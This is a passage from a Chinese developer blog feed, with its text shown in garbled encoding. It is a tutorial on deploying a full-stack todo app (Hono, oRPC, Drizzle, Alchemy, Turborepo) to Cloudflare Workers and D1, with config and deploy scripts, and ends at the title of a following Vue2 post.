<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/200280409d31438299c69d72882c5049~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=J4yCKa6DDVTMRoWLlAAwD5sQBS8%3D" alt="" width="50%" loading="lazy"/>
<p>ç„¶ååœ¨ <code>/apps/web/package.json</code> ä¸ <code>/apps/server/package.json</code> æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ä½¿ç”¨æ ¹ç›®å½•çš„catalogsäº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e21f40753a5348eb86e01c8652f2be73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=VQ80OWv1Knbwa8if9jQzXzwDbJs%3D" alt="" width="50%" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9deac12f0d4d49d1b2c84a0a4f2e84d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=mF1i0UjpeAWClzJqUW2m9FSDzvE%3D" alt="" width="100%" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.pnpm.cn%2Fworkspaces" target="_blank" title="https://www.pnpm.cn/workspaces" ref="nofollow noopener noreferrer">www.pnpm.cn/workspaces</a> workspaces æ–¹ä¾¿å¼•ç”¨åŒä¸€å·¥ä½œåŒºçš„å…¶ä»–å­æ¨¡å—çš„æ–‡ä»¶ã€‚</p>
<h3 data-id="heading-6">Hono</h3>
<p>Hono æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ Web æ¡†æ¶ï¼Œä¸»è¦é¢å‘ JavaScript å’Œ TypeScript ç”Ÿæ€ã€‚å®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯é«˜æ€§èƒ½ã€ä½å¼€é”€ï¼Œä»¥åŠåœ¨ä¸åŒè¿è¡Œæ—¶ç¯å¢ƒä¸­çš„ä¸€è‡´ä½“éªŒ</p>
<p>å®˜ç½‘: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhono.dev%2F" target="_blank" title="https://hono.dev/" ref="nofollow noopener noreferrer">hono.dev/</a> ,å¸¸ç”¨ä¸äº cloudflare ç›¸ç»“åˆå‡ºç°ã€‚nodejs backend æ¡†æ¶ä¹Ÿæ˜¯å¤šç§å¤šæ ·çš„ï¼Œé€‰æ‹©è‡ªå·±å–œæ¬¢çš„å³å¯ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6c2dccc45764a2a88cabec21bfca044~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=sLaCFSgjfFwl7WMY27xuUQCLDyg%3D" alt="" width="100%" loading="lazy"/>
<h3 data-id="heading-7">ORPC</h3>
<p>orpc ç®€å•è®²å°±æ˜¯ trpc çš„è¿›åŒ–ç‰ˆã€‚</p>
<p>trpcå¯èƒ½æœ‰çš„åŒå­¦ä¹Ÿä¸æ˜¯å¾ˆäº†è§£ï¼Œå¼•ç”¨è‡ªå®˜ç½‘çš„ä»‹ç» <code>å¿«é€Ÿè¿­ä»£ï¼Œæ— å¿§æ— è™‘ã€‚è½»æ¾æ„å»ºç«¯åˆ°ç«¯ç±»å‹å®‰å…¨çš„ API </code>ã€‚</p>
<p>è¯´äººè¯å°±æ˜¯å‰åç«¯å…±ç”¨ä¸€å¥—TSï¼Œç„¶åå‰ç«¯è°ƒç”¨æ¥å£å°±å¯ä»¥ç›´æ¥ä»¥å‡½æ•°è°ƒç”¨çš„æ–¹å¼è®¿é—®åç«¯æ¥å£ï¼Œå‰ç«¯å¯ä»¥ç›´æ¥è·å¾—åç«¯æš´éœ²çš„ API ç±»å‹å®šä¹‰ã€‚ä¸ç”¨ä¼ ç»Ÿçš„å‰åç«¯è”è°ƒï¼Œåç«¯ç»™openapiæ–‡æ¡£ï¼Œå‰ç«¯ç”Ÿæˆå¯¹åº”çš„TSæ¥å£å“åº”å…¥å‚ä¸å‡ºå‚äº†ï¼Œç›´æ¥ä¸€å¥—å‰ç«¯è¦è°ƒç”¨æ¥å£ç›´æ¥ç‚¹å‡ºæ¥ã€‚</p>
<p>orpc å°±æ˜¯åœ¨ trpc çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹é€ ï¼Œå®˜ç½‘: <a href="https://link.juejin.cn?target=https%3A%2F%2Forpc.dev%2Fdocs%2Fgetting-started" target="_blank" title="https://orpc.dev/docs/getting-started" ref="nofollow noopener noreferrer">orpc.dev/docs/gettinâ€¦</a> <code>oRPCï¼ˆå¼€æ”¾ API è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ç»“åˆäº† RPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ä¸ OpenAPIï¼Œå…è®¸æ‚¨é€šè¿‡ç±»å‹å®‰å…¨çš„ API å®šä¹‰å’Œè°ƒç”¨è¿œç¨‹ï¼ˆæˆ–æœ¬åœ°ï¼‰è¿‡ç¨‹ï¼ŒåŒæ—¶éµå¾ª OpenAPI è§„èŒƒã€‚</code> å¯ä»¥åœ¨äº«å—trpcçš„åŒæ—¶ç”Ÿæˆopenapiè§„èŒƒçš„æ–‡æ¡£ã€‚</p>
<p>è®¿é—®æˆ‘ä»¬è¿™ä¸ªç¤ºä¾‹é¡¹ç›®çš„ <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000%2Fapi-reference" target="_blank" title="http://localhost:3000/api-reference" ref="nofollow noopener noreferrer">http://localhost:3000/api-reference</a> å°±å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç¾è§‚çš„openapiè§„èŒƒçš„åœ¨çº¿æ¥å£ç¤ºä¾‹</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00012fc6bbb6422c83fc426149e826cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=rMybMGmMar3Z68hfgiVns2D6Ps4%3D" alt="" width="100%" loading="lazy"/>
<p>æˆ‘ä»¬æ¥çœ‹orpcæœ‰å¤šæ–¹ä¾¿ã€‚</p>
<p><code>packages\api\src\routers\todo.ts</code> æ¥å£çš„å®šä¹‰</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73c0988577694466b24db74066a68ad6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=yOGe%2BjHh%2FDHEf1F1zA3%2B8t5ADNo%3D" alt="" width="100%" loading="lazy"/>
<p><code>apps\web\src\routes\todos.tsx</code> å‰ç«¯ç•Œé¢ç›´æ¥è°ƒç”¨ç‚¹å‡ºæ¥è¦ä½¿ç”¨çš„å‡½æ•°ã€‚ç„¶åç”¨ <code>@tanstack/react-query</code> ç›¸å…³çš„hookè¿›è¡Œå¤„ç†ï¼Œ</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f5cfdccb1d54645b748c5860c98bd25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=zMZsO6pYjHlCfoqurKhQ0ZqY6UI%3D" alt="" width="100%" loading="lazy"/>
<p>orpcä¹Ÿå¯ä»¥å¾ˆå¥½çš„ä¸tanstack-queryç›¸ç»“åˆã€‚è¿™æ ·å­ç›´æ¥å¼€å‘ä¸ªäººé¡¹ç›®çš„æ—¶å€™å°±å…å»äº†æ¥å£è”è°ƒçš„éº»çƒ¦ï¼Œå†™å®Œåç«¯å‰ç«¯ç›´æ¥è°ƒç”¨ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b38a83e0fbd0484c837ed64470f9e4c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=nR4yLP0CNHVerIBfDAcZhqCMcfE%3D" alt="" width="100%" loading="lazy"/>
<h3 data-id="heading-8">drizzle</h3>
<p>drizzle orm å°±æ˜¯æ–¹ä¾¿ä½ æ¥å¢åˆ æ”¹æŸ¥æ•°æ®çš„ï¼Œåœ¨æ²¡æœ‰è¿™äº›ORMçš„æ—¶å€™éœ€è¦ç›´æ¥å†™SQLè¯­å¥æ‰§è¡Œï¼Œæœ‰äº†è¿™äº›ORMä»–ä»¬å°è£…äº†ä¸€äº›æ–¹æ³•è®©ä½ æ›´è½»æ¾çš„æŒæ§æ•°æ®ã€‚ç„¶åå®åœ¨å¤æ‚çš„SQLä¹Ÿå¯ä»¥è‡ªå®šä¹‰ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/768274e612fb415aa9abb81735744f92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=NyLIOY9I67NDOo%2FDcoH5N3W2yQI%3D" alt="" width="100%" loading="lazy"/>
<p>nodeçš„ORMé€‰æ‹©æœ‰è›®å¤šçš„ é€‰è‡ªå·±å–œæ¬¢çš„æˆ–è€…å¤§å®¶æ¨èæ¯”è¾ƒå¤šçš„å³å¯ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b46a3cc33ec4441987d05446ac17dd90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=ZGbz72txRtQJc0je7wALs8T3F5w%3D" alt="" width="100%" loading="lazy"/>
<h3 data-id="heading-9">Alchemy</h3>
<p>è¿™ä¸ªä¸œè¥¿æˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§åˆ°ï¼Œæˆ‘ç›´æ¥åœ¨bingæœè¿˜æœä¸åˆ° éœ€è¦åŠ ä¸€äº›å…³é”®è¯ï¼Œä½†æ„Ÿè§‰åšçš„è¿˜ä¸é”™ï¼Œè¿™é‡Œæ˜¯å®˜ç½‘: <a href="https://link.juejin.cn?target=https%3A%2F%2Falchemy.run%2Fwhat-is-alchemy%2F" target="_blank" title="https://alchemy.run/what-is-alchemy/" ref="nofollow noopener noreferrer">alchemy.run/what-is-alcâ€¦</a> ç®€å•è®²å°±æ˜¯å¸®ä½ ç®¡ç†ä¸€äº›éƒ¨ç½²ç”¨çš„åŸºç¡€è®¾æ–½ä¿¡æ¯ï¼Œæˆ‘è¿™é‡Œæ˜¯éƒ¨ç½²åˆ° cloudflareï¼Œç„¶åæœ‰ä¸€ä¸ª <code>alchemy.run.ts</code> æ–‡ä»¶å°±æ˜¯ç®¡ç†å…¨éƒ¨éƒ¨ç½²åˆ° cloudflareç›¸å…³çš„äº‹æƒ…ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc7f519d73e24e27b7a41ad34bc813ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=hgPXzlxrkQkkIQ08afYRYpl90GE%3D" alt="" width="100%" loading="lazy"/>
<p>å¦‚æœä½ å°è¯• <code>pnpm run deploy</code> éƒ¨ç½²è¿™ä¸ªé¡¹ç›®çš„æ—¶å€™ä¼šå‘ç°è¿è¡Œä¸æˆåŠŸï¼Œå› ä¸ºä½ è¿˜æ²¡æœ‰ç»™æœ¬åœ°çš„ alchemy æˆæƒä½ çš„ cloudflare è´¦æˆ·ã€‚</p>
<p><code>npm i -g alchemy</code>å®‰è£…å®Œæˆå <code>alchemy configure</code> ä¼šæ‰“å¼€ä¸€ä¸ªæˆæƒé¡µæˆæƒåˆ°æœ¬åœ°å³å¯ã€‚å¦‚æœæ‰“ä¸å¼€æˆ–æˆæƒå¤±è´¥ï¼Œè¯·å°è¯•æ‰“å¼€vpnçš„ TUN æ¨¡å¼è¯•ä¸‹ã€‚</p>
<h3 data-id="heading-10">Turborepo</h3>
<p>Turborepo æ˜¯ä¸€ä¸ªç”¨äº JavaScript å’Œ TypeScript ä»£ç åº“çš„é«˜æ€§èƒ½æ„å»ºç³»ç»Ÿã€‚å®ƒä¸“ä¸ºæ‰©å±•å•ä½“ä»“åº“è€Œè®¾è®¡ï¼Œä¹Ÿèƒ½åŠ é€Ÿ<a href="https://link.juejin.cn?target=https%3A%2F%2Fturbo.net.cn%2Fdocs%2Fguides%2Fsingle-package-workspaces" target="_blank" title="https://turbo.net.cn/docs/guides/single-package-workspaces" ref="nofollow noopener noreferrer">å•åŒ…å·¥ä½œåŒº</a>ä¸­çš„å·¥ä½œæµã€‚</p>
<p>vercelå¼€æºçš„ä¸€ä¸ªé¡¹ç›®ï¼Œå¸¸ç”¨äºå¤„ç† monorepo ç±»å‹ä»“åº“çš„æ„å»ºã€‚</p>
<h3 data-id="heading-11">Cloudflare</h3>
<p>æˆ‘ä»¬è¿™ä¸ªé¡¹ç›®å‰åç«¯éƒ½éƒ¨ç½²åˆ° cf çš„ wokerä¸Šï¼Œæœ‰å¾ˆå¤šçš„å…è´¹é¢åº¦ï¼ŒcfçœŸæ˜¯å¤§å–„äººã€‚ç„¶åæ•°æ®å­˜å‚¨çš„æ•°æ®åº“ä½¿ç”¨çš„ä¹Ÿæ˜¯ cf çš„D1æ•°æ®åº“ï¼Œä¸ªäººMVPçš„é¡¹ç›®åˆæœŸåº”è¯¥å¤Ÿç”¨äº†ï¼Œå‡çº§äº†ä¹Ÿä¸è´µï¼Œä¸æ„§æ˜¯èµ›åšä½›ç¥–ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/241ba89fd47f4055b4d789c8d407b3a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=NGTE%2BWgy0cQk2NwV%2B1CPddllLM0%3D" alt="" width="50%" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ffbf7eeebfe4b67a851a2cc71229c4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=zG07HZWj6wjXGEidcF0HjYv0XRs%3D" alt="" width="50%" loading="lazy"/></p>
<h2 data-id="heading-12">é¡¹ç›®éƒ¨ç½²</h2>
<p>æˆæƒå®Œæˆåï¼Œæˆ‘ä»¬è¿è¡Œ <code>pnpm run deploy</code> è¯•ä¸€ä¸‹ã€‚å¯ä»¥çœ‹åˆ°ç»™å‡ºäº†å‰åç«¯ä¸¤ä¸ªåœ°å€ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/876832ac0f0543c485a7b8e3b057d3b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=wi82FkQX%2BlewTl4CNCROXvq7%2BUs%3D" alt="" width="100%" loading="lazy"/>
<p>è®¿é—®å‰ç«¯åå‘ç°ï¼Œæˆ‘é è¿™ä¹ˆè¯·æ±‚çš„æ˜¯localhost:3000, åŸæ¥æˆ‘ä»¬å‰åç«¯çš„ .env æ–‡ä»¶éƒ½æ²¡è¿›è¡Œä¿®æ”¹ã€‚</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da949dc8b16845568c6c90a52706c7d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=fFKve0cnsqdM%2Fxj9oJODs8lcRM0%3D" alt="" width="100%" loading="lazy"/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c817a38bdee47ea8a67cc55ce583ab8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=OazjozjXS43OLACX%2F%2BFlLiAQs6Q%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02ad08bcaa12498cb729dcb6d7045eeb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=vlzsJ8Cu4PyH46TjlF1SI63nKSI%3D" alt="" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de53f0acd85e4efba517023e261c1e73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=hw7GgQnlHYs0GxZTXgCoocuNo6Y%3D" alt="" loading="lazy"/></p>
<p>åœ¨åç«¯çš„æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ª<code>.env.dev</code>æ–‡ä»¶ï¼ŒCORS_ORIGIN å¡«å†™å‰ç«¯è®¿é—®çš„åœ°å€ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">CORS_ORIGIN=[å¡«å†™å‰ç«¯åœ°å€]
</code></pre>
<p>å‰ç«¯åˆ›å»ºä¸€ä¸ª <code>.env.dev</code>æ–‡ä»¶</p>
<pre><code class="hljs language-shell" lang="shell">VITE_SERVER_URL=[å¡«å†™åç«¯åœ°å€]
</code></pre>
<p>ç„¶åæ·»åŠ ä¸€ä¸ª <code>pnpm run deploy:dev</code> å‘½ä»¤åœ¨æ ¹ç›®å½•çš„ package.json æ–‡ä»¶ï¼Œè¡¨ç¤ºæˆ‘ä»¬è¦å¯¹ env.dev ç¯å¢ƒå˜é‡çš„å†…å®¹è¿›è¡Œæ‰“åŒ…æ„å»ºã€‚å¤åˆ¶ä¸Šä¸€è¡Œçš„ deploy å‘½ä»¤åŸºç¡€ä¸Šå†æ·»åŠ äº†ä¸€ä¸ª ALCHEMY_ENV=dev çš„æ ‡è¯†ã€‚</p>
<pre><code class="hljs language-shell" lang="shell">"deploy:dev": "cross-env ALCHEMY_ENV=dev turbo -F @cf-todo/infra deploy",
</code></pre>
<p>å†ä¿®æ”¹ <code>alchemy.run.ts</code> æ–‡ä»¶ï¼Œæ ¹æ®ç¯å¢ƒå˜é‡è¯»å–å¯¹åº”çš„envæ–‡ä»¶</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> alchemy <span class="hljs-keyword">from</span> <span class="hljs-string">"alchemy"</span>;
<span class="hljs-keyword">import</span> { D1Database, <span class="hljs-title class_">Vite</span>, <span class="hljs-title class_">Worker</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"alchemy/cloudflare"</span>;
<span class="hljs-keyword">import</span> { config } <span class="hljs-keyword">from</span> <span class="hljs-string">"dotenv"</span>;

<span class="hljs-keyword">const</span> mode = process.<span class="hljs-property">env</span>.<span class="hljs-property">ALCHEMY_ENV</span> ?? process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> ?? <span class="hljs-string">"development"</span>;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadEnv</span> = (<span class="hljs-params">path: string, override = <span class="hljs-literal">false</span></span>) =&gt; {
  <span class="hljs-title function_">config</span>({ path, override });
};

<span class="hljs-title function_">loadEnv</span>(<span class="hljs-string">"./.env"</span>);
<span class="hljs-title function_">loadEnv</span>(<span class="hljs-string">`./.env.<span class="hljs-subst">${mode}</span>`</span>, <span class="hljs-literal">true</span>);
<span class="hljs-title function_">loadEnv</span>(<span class="hljs-string">"../../apps/web/.env"</span>);
<span class="hljs-title function_">loadEnv</span>(<span class="hljs-string">`../../apps/web/.env.<span class="hljs-subst">${mode}</span>`</span>, <span class="hljs-literal">true</span>);
<span class="hljs-title function_">loadEnv</span>(<span class="hljs-string">"../../apps/server/.env"</span>);
<span class="hljs-title function_">loadEnv</span>(<span class="hljs-string">`../../apps/server/.env.<span class="hljs-subst">${mode}</span>`</span>, <span class="hljs-literal">true</span>);

<span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title function_">alchemy</span>(<span class="hljs-string">"cf-todo"</span>);

<span class="hljs-keyword">const</span> db = <span class="hljs-keyword">await</span> <span class="hljs-title function_">D1Database</span>(<span class="hljs-string">"database"</span>, {
  <span class="hljs-attr">migrationsDir</span>: <span class="hljs-string">"../../packages/db/src/migrations"</span>,
});

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> web = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Vite</span>(<span class="hljs-string">"web"</span>, {
  <span class="hljs-attr">cwd</span>: <span class="hljs-string">"../../apps/web"</span>,
  <span class="hljs-attr">assets</span>: <span class="hljs-string">"dist"</span>,
  <span class="hljs-attr">bindings</span>: {
    <span class="hljs-attr">VITE_SERVER_URL</span>: alchemy.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_SERVER_URL</span>!,
  },
});

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> server = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">"server"</span>, {
  <span class="hljs-attr">cwd</span>: <span class="hljs-string">"../../apps/server"</span>,
  <span class="hljs-attr">entrypoint</span>: <span class="hljs-string">"src/index.ts"</span>,
  <span class="hljs-attr">compatibility</span>: <span class="hljs-string">"node"</span>,
  <span class="hljs-attr">bindings</span>: {
    <span class="hljs-attr">DB</span>: db,
    <span class="hljs-attr">CORS_ORIGIN</span>: alchemy.<span class="hljs-property">env</span>.<span class="hljs-property">CORS_ORIGIN</span>!,
  },
  <span class="hljs-attr">dev</span>: {
    <span class="hljs-attr">port</span>: <span class="hljs-number">3000</span>,
  },
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Web    -&gt; <span class="hljs-subst">${web.url}</span>`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server -&gt; <span class="hljs-subst">${server.url}</span>`</span>);

<span class="hljs-keyword">await</span> app.<span class="hljs-title function_">finalize</span>();
</code></pre>
<p>æœ€åè¿˜éœ€è¦åœ¨turbo.json æ–‡ä»¶æ·»åŠ ä¸‹æ„å»ºä¼ é€’çš„è¿™ä¸ªæ ‡è¯†å˜é‡ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"deploy"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"cache"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"env"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"ALCHEMY_ENV"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<h2 data-id="heading-13">é‡æ–°éƒ¨ç½²</h2>
<p>å…ˆè¿è¡Œ <code>pnpm run destory</code> é”€æ¯ä¹‹å‰çš„èµ„æºã€‚å†æ‰§è¡Œ <code>pnpm run deploy:dev</code>ã€‚nice å¯ä»¥ä½¿ç”¨äº†ï¼Œç¾æ»‹æ»‹~</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/639bcdbe0ac84d56a18634a17199db6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5bCP5a2m5YOn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770256809&amp;x-signature=5tg1r0TDShQIdHfpe6KZ6FVIPIY%3D" alt="" width="100%" loading="lazy"/>
<h2 data-id="heading-14">ç»“è¯­</h2>
<p>ç°åœ¨ï¼Œä¸€ä¸ªç®€å•å®Œæ•´çš„å‰åç«¯é¡¹ç›®å·²ç»å‡†å¤‡å¥½ï¼Œå¹¶ä¸”å¯ä»¥é›¶æˆæœ¬å®Œæˆéƒ¨ç½²ï¼Œå·²ç»äº¤åˆ°ä½ æ‰‹é‡Œäº†ã€‚æ¥ä¸‹æ¥å°±å¯ä»¥å……åˆ†å‘æŒ¥æƒ³è±¡åŠ›å’Œåˆ›é€ åŠ›ï¼Œå»æ‰“ç£¨ä¸€ä¸ªè®©äººçœ¼å‰ä¸€äº®çš„äº§å“ã€‚ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ç»§ç»­æ·±å…¥ç ”ç©¶è¿™ä¸ªé¡¹ç›®ï¼Œå€ŸåŠ©AIçš„èƒ½åŠ›ä¸æ–­å­¦ä¹ æˆ–åˆ›ä½œã€‚å¸Œæœ›å¯¹å¤§å®¶æœ‰å¸®åŠ©ï¼</p>
<p>æ”¹é€ éƒ¨ç½²æ–‡ä»¶å‚è€ƒ: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLLmoskk%2Forpc-todolist%2Ftree%2Ffeature%2Ftodolist" target="_blank" title="https://github.com/LLmoskk/orpc-todolist/tree/feature/todolist" ref="nofollow noopener noreferrer">github.com/LLmoskk/orpâ€¦</a></p>
<p>æœ€åï¼Œæ„Ÿæ©Cloudflareï¼æ„Ÿæ© <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.better-t-stack.dev%2Fnew" target="_blank" title="https://www.better-t-stack.dev/new" ref="nofollow noopener noreferrer">better-t-stack.dev/new</a> é¡¹ç›®ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è€é¡¹ç›® Vue2 å‡½æ•°å¼æ‰“å¼€å¼¹å±‚ã€é™„æºç ã€‘]]></title>    <link>https://juejin.cn/post/7600060708932141066</link>    <guid>https://juejin.cn/post/7600060708932141066</guid>    <pubDate>2026-01-28T05:59:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600060708932141066" data-draft-id="7600034446947303462" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è€é¡¹ç›® Vue2 å‡½æ•°å¼æ‰“å¼€å¼¹å±‚ã€é™„æºç ã€‘"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-28T05:59:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å¤§å«"/> <meta itemprop="url" content="https://juejin.cn/user/1961184474695213"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è€é¡¹ç›® Vue2 å‡½æ•°å¼æ‰“å¼€å¼¹å±‚ã€é™„æºç ã€‘
